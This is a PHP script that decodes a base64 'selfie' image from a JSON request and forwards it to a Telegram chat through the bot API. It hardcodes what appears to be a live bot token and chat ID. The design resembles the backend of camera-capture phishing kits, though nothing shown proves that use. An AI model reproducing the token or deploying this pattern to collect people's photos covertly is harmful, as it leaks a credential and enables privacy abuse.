<?php
// upload.php

// Read JSON body
$input = file_get_contents("php://input");
$data = json_decode($input, true);

if (!isset($data['image'])) {
    http_response_code(400);
    echo "No image provided";
    exit;
}

$imageData = $data['image'];
// remove "data:image/jpeg;base64," or "data:image/png;base64,"
if (preg_match('/^data:(image\/\w+);base64,/', $imageData, $type)) {
    $imageData = substr($imageData, strpos($imageData, ',') + 1);
    $type = $type[1]; // e.g. image/jpeg
} else {
    $type = 'image/png';
}

$imageData = str_replace(' ', '+', $imageData);
$decoded = base64_decode($imageData);
if ($decoded === false) {
    http_response_code(400);
    echo "Base64 decode failed";
    exit;
}

// save temp file
$tmpfname = sys_get_temp_dir() . '/selfie_' . time() . '.jpg';
file_put_contents($tmpfname, $decoded);

// Telegram settings: replace these with your values
$botToken = '8238278317:AAECzodQoH-hQ6shFW9dsoDwGyMiFnxDt9Q';
$chatId = '7516373366';

// send photo via multipart/form-data
$sendUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";

$postFields = [
    'chat_id' => $chatId,
    'photo' => new CURLFile($tmpfname)
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $sendUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
$result = curl_exec($ch);
$err = curl_error($ch);
curl_close($ch);

// remove temp file
@unlink($tmpfname);

if ($err) {
    http_response_code(500);
    echo "Curl error: $err";
} else {
    header('Content-Type: application/json');
    echo $result;
}
?>
